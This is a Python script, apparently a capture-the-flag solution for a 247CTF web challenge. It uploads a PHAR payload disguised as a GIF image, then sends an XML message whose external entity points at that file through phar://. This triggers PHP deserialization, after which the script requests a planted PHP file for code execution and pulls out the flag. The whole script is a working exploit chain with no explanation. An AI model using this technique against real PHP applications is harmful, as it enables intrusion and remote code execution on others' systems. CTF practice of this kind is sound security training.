import requests
import subprocess
import re

url = "https://6b3ce533440b4734.247ctf.com/"

subprocess.run(['php', '-d', 'phar.readonly=0', 'exploit.php'])

# upload phar payload
with open('payload.phar', "rb") as f:
    res = requests.post(url, files={
        'image': ('payload.gif', f.read(), 'image/gif')
    })

    path = re.findall(r'uploaded (.+)!', res.text)[0].strip()

print("> PHAR uploaded:", path)

# xxe to phar deserialization
payload = f'''
<!DOCTYPE message [
  <!ENTITY % xxe SYSTEM "phar://{path}/a">
  %xxe;
]>
<message>
  <to>a</to>
  <from>a</from>
  <image>a</image>
</message>
'''.strip()

res = requests.post(url, data={
    'message': payload
})

print("> XXE triggered")

# rce
res = requests.get(f'{url}/.php')

flag = re.findall(r'(247CTF{.+})', res.text)[0]
print("Flag:", flag)